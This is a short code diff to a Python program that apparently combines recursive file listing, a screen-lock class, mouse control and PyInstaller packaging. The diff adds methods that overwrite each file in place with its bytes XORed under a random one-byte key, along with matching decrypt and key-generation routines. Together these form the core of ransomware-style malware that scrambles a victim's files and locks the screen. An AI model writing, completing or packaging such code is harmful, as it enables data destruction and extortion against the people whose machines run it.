@@ -11,6 +11,8 @@ from pynput.mouse import Controller
 from PIL import Image, ImageTk
 import PyInstaller.__main__
 
+import random
+
 class Encrypt:
     def __init__(self):
         pass
@@ -23,6 +25,24 @@ class Encrypt:
                 yield element_path
             elif os.path.isdir(element_path):
                 yield from self.get_files(element_path)
+
+    def encrypt(self, file, key):
+        with open(file, 'rb') as f:
+            data = f.read()
+        with open(file, 'wb') as f:
+            f.write(self.xor(data, key))
+
+    def decrypt(self, file, key):
+        with open(file, 'rb') as f:
+            data = f.read()
+        with open(file, 'wb') as f:
+            f.write(self.xor(data, key))
+
+    def xor(self, data, key):
+        return bytearray(a ^ key for a in data)
+
+    def generate_key(self):
+        return random.randint(0, 255)
 
 
 class ScreenLock:
